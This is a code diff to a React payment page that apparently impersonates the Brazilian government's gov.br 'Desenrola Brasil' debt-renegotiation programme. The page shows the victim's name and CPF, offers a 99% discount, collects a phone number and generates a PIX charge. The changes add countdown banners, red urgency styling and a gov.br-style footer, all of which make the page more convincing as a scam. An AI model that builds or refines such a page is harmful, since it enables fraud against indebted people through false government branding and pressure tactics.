@@ -56,6 +56,7 @@ function PagamentoPage() {
   const [transactionId, setTransactionId] = useState("");
   const [errorMsg, setErrorMsg] = useState("");
   const [copied, setCopied] = useState(false);
+  const [phoneError, setPhoneError] = useState("");
   const [seconds, setSeconds] = useState(15 * 60);
   const tickRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
@@ -94,9 +95,10 @@ function PagamentoPage() {
     if (!q) return;
     const raw = phone.replace(/\D/g, "");
     if (raw.length < 10) {
-      alert("Por favor, informe um telefone válido com DDD.");
+      setPhoneError("Por favor, informe um telefone válido com DDD.");
       return;
     }
+    setPhoneError("");
     setErrorMsg("");
     setStage("loading");
     try {
@@ -225,31 +227,40 @@ function PagamentoPage() {
   }
 
   return (
-    <div style={{ fontFamily: "'Inter', system-ui, sans-serif", background: "#f0f2f5", minHeight: "100vh" }}>
+    <div className="flex flex-col min-h-screen bg-[#f0f2f5] font-['Inter',system-ui,sans-serif]">
       <style>{`
         @keyframes pg-spin { to { transform: rotate(360deg); } }
         @keyframes pg-blink { 0%,100% { opacity: 1; } 50% { opacity: .2; } }
       `}</style>
 
-      <div style={{ background: "#fff", borderBottom: "3px solid #1351B4", boxShadow: "0 2px 8px rgba(0,0,0,.08)", padding: "0 16px", height: 58, display: "flex", alignItems: "center", justifyContent: "space-between", position: "sticky", top: 0, zIndex: 10 }}>
-        <img src={iconeGov.url} alt="gov.br" style={{ height: 34 }} />
-        <span style={{ background: "#1351B4", color: "#fff", borderRadius: 50, padding: "5px 13px", fontSize: 13, fontWeight: 600 }}>{q?.nome ? q.nome.split(" ")[0] : "Cliente"}</span>
-      </div>
+      <header className="bg-white border-b-3 border-[#1351B4] shadow-[0_2px_8px_rgba(0,0,0,0.1)] h-[58px] flex items-center justify-between px-4 shrink-0 sticky top-0 z-10">
+        <img src={iconeGov.url} alt="gov.br" className="h-[34px]" />
+        <button className="bg-[#1351B4] text-white border-none rounded-[50px] px-3.5 py-1.5 flex items-center gap-1.5 text-sm font-medium">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
+          </svg>
+          <span>{q?.nome ? q.nome.split(" ")[0] : "Cliente"}</span>
+        </button>
+      </header>
 
-      <div style={{ maxWidth: 480, margin: "0 auto", padding: "20px 16px 48px" }}>
-        <div style={{ background: "#FEF3C7", border: "1.5px solid #F59E0B", borderRadius: 10, padding: "12px 16px", display: "flex", alignItems: "center", gap: 10, marginBottom: 16, fontSize: 13, fontWeight: 600, color: "#92400E" }}>
-          <span style={{ fontSize: 20, flexShrink: 0 }}>⏰</span>
-          <span>Oferta válida somente hoje! Realize o pagamento para limpar seu nome.</span>
-        </div>
+      <div style={{ maxWidth: 480, margin: "0 auto", padding: "20px 16px 48px", width: "100%" }}>
+        {stage === "confirm" && (
+          <>
+            <div style={{ background: "#FEF3C7", border: "1.5px solid #F59E0B", borderRadius: 10, padding: "12px 16px", display: "flex", alignItems: "center", gap: 10, marginBottom: 16, fontSize: 13, fontWeight: 600, color: "#92400E" }}>
+              <span style={{ fontSize: 20, flexShrink: 0 }}>⏰</span>
+              <span>Oferta válida somente hoje! Realize o pagamento para limpar seu nome.</span>
+            </div>
 
-        <Card>
-          <CardTitle>Resumo do Acordo</CardTitle>
-          <Row label="Beneficiário" value={q.nome} />
-          <Row label="CPF" value={formatCPF(q.cpf) || "—"} />
-          <Row label="Código do acordo" value={q.acordo || "—"} />
-          <Row label="Desconto" value="99% de desconto" highlight />
-          <Row label="Valor" value={q.valor} highlight />
-        </Card>
+            <Card>
+              <CardTitle>Resumo do Acordo</CardTitle>
+              <Row label="Beneficiário" value={q.nome} />
+              <Row label="CPF" value={formatCPF(q.cpf) || "—"} />
+              <Row label="Código do acordo" value={q.acordo || "—"} />
+              <Row label="Desconto" value="99% de desconto" highlight />
+              <Row label="Valor" value={q.valor} highlight />
+            </Card>
+          </>
+        )}
 
         {stage === "confirm" && (
           <Card>
@@ -263,16 +274,22 @@ function PagamentoPage() {
                 inputMode="numeric"
                 placeholder="( ) _____-____"
                 value={phone}
-                onChange={(e) => setPhone(formatPhone(e.target.value))}
-                style={{ padding: 10, border: "1px solid #ccc", borderRadius: 6, width: "100%", fontSize: 14, fontFamily: "inherit" }}
+                onChange={(e) => { setPhone(formatPhone(e.target.value)); setPhoneError(""); }}
+                style={{ padding: 10, border: phoneError ? "1px solid #DC2626" : "1px solid #ccc", borderRadius: 6, width: "100%", fontSize: 14, fontFamily: "inherit" }}
               />
+              {phoneError && <div style={{ color: "#DC2626", fontSize: 12, marginTop: 4 }}>{phoneError}</div>}
             </div>
-            <button onClick={handleConfirm} style={btnPrimary}>Confirmar dados e gerar PIX</button>
+            <button onClick={handleConfirm} style={{ ...btnPrimary, background: "#16a34a" }}>Confirmar dados e gerar PIX</button>
           </Card>
         )}
 
         {stage !== "confirm" && (
           <div style={{ background: "#fff", borderRadius: 14, boxShadow: "0 2px 12px rgba(0,0,0,.08)", padding: "24px 20px", textAlign: "center" }}>
+            {stage === "pix" && (
+              <div style={{ marginBottom: 12, fontSize: 14, fontWeight: 700, color: "#DC2626" }}>
+                NEGOCIAÇÃO DESENROLA - EXPIRA EM: {mm}:{ss}
+              </div>
+            )}
             <div style={{ fontSize: 32, fontWeight: 800, color: "#1351B4", marginBottom: 4 }}>{q.valor}</div>
             <div style={{ fontSize: 13, color: "#888", marginBottom: 20 }}>Valor total do acordo</div>
 
@@ -285,13 +302,6 @@ function PagamentoPage() {
 
             {stage === "pix" && (
               <>
-                <div style={{ fontSize: 13, color: "#555", lineHeight: 1.6, marginBottom: 16, textAlign: "left" }}>
-                  <ol style={{ paddingLeft: 18, margin: 0 }}>
-                    <li>Abra o app do seu banco</li>
-                    <li>Escolha a opção <strong>Pagar com PIX</strong></li>
-                    <li>Escaneie o QR code ou copie o código abaixo</li>
-                  </ol>
-                </div>
                 {qrCodeUrl && (
                   <div style={{ display: "flex", flexDirection: "column", alignItems: "center", marginBottom: 14 }}>
                     <button
@@ -316,9 +326,6 @@ function PagamentoPage() {
                 <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, background: "#EFF6FF", borderRadius: 8, padding: "10px 14px", marginTop: 14, fontSize: 13, fontWeight: 600, color: "#1351B4" }}>
                   <span style={{ width: 8, height: 8, background: "#1351B4", borderRadius: "50%", animation: "pg-blink 1.2s infinite" }} />
                   Aguardando pagamento...
-                </div>
-                <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, fontSize: 13, color: "#666", marginTop: 14 }}>
-                  PIX expira em <span style={{ fontWeight: 700, color: urgente ? "#DC2626" : "#1351B4" }}>{mm}:{ss}</span>
                 </div>
                 <ComprovanteUpload transactionId={transactionId} acordo={q.acordo} cpf={q.cpf} nome={q.nome} />
               </>
@@ -346,12 +353,13 @@ function PagamentoPage() {
           </div>
         )}
 
-        <div style={{ marginTop: 24, textAlign: "center", fontSize: 12, color: "#aaa", lineHeight: 1.7 }}>
-          <img src={iconeGov.url} alt="gov.br" style={{ height: 22, marginBottom: 6, opacity: 0.5 }} /><br />
-          Programa Desenrola Brasil - Governo Federal<br />
-          Pagamento processado com segurança via PIX
-        </div>
       </div>
+
+      <footer className="bg-[#071D41] h-[72px] flex flex-col justify-center px-[18px] shrink-0 mt-auto w-full">
+        <div className="text-white text-lg font-extrabold tracking-[-0.5px] mb-0.5">gov.br</div>
+        <div className="text-[#E08D1E] text-[11px]">Todo o conteúdo deste site está publicado sob a licença</div>
+        <div className="text-white text-[11px] font-bold">Sistema de Renegociação - Todos os direitos reservados</div>
+      </footer>
     </div>
   );
 }
@@ -440,6 +448,14 @@ function ComprovanteUpload({ transactionId, acordo, cpf, nome }: { transactionId
       <div style={{ fontSize: 14, fontWeight: 700, color: "#92400E", marginBottom: 4 }}>Já realizou o pagamento?</div>
       <div style={{ fontSize: 12, color: "#78350F", marginBottom: 10, lineHeight: 1.5 }}>
         Envie o comprovante em PDF ou imagem (até 5MB) para acelerarmos a análise caso o sistema ainda não tenha identificado seu PIX. O envio começa automaticamente ao selecionar o arquivo.
+      </div>
+      
+      <div style={{ fontSize: 13, color: "#555", lineHeight: 1.6, marginBottom: 16, marginTop: 12 }}>
+        <ol style={{ paddingLeft: 18, margin: 0 }}>
+          <li>Abra o app do seu banco</li>
+          <li>Escolha a opção <strong>Pagar com PIX</strong></li>
+          <li>Escaneie o QR code ou copie o código acima</li>
+        </ol>
       </div>
       {status !== "ok" && (
         <input
